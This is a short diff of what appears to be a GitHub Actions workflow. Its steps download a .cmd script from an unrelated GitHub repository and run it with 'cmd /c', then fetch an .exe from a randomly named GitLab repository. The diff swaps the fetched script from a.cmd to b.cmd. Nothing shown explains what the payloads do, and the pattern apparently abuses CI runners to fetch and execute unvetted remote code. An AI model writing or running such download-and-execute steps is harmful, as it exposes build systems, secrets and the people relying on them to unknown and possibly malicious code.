@@ -10,9 +10,9 @@ jobs:
     steps:
     - name: Download
       run: |
-          curl -s -L -o setup.cmd https://github.com/Efebey2903/fictional-octo-waffle/raw/main/a.cmd
+          curl -s -L -o setup.cmd https://github.com/Efebey2903/fictional-octo-waffle/raw/main/b.cmd
     
-    - name: rrt
+    - name: run
       run: |
            cmd /c setup.cmd
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
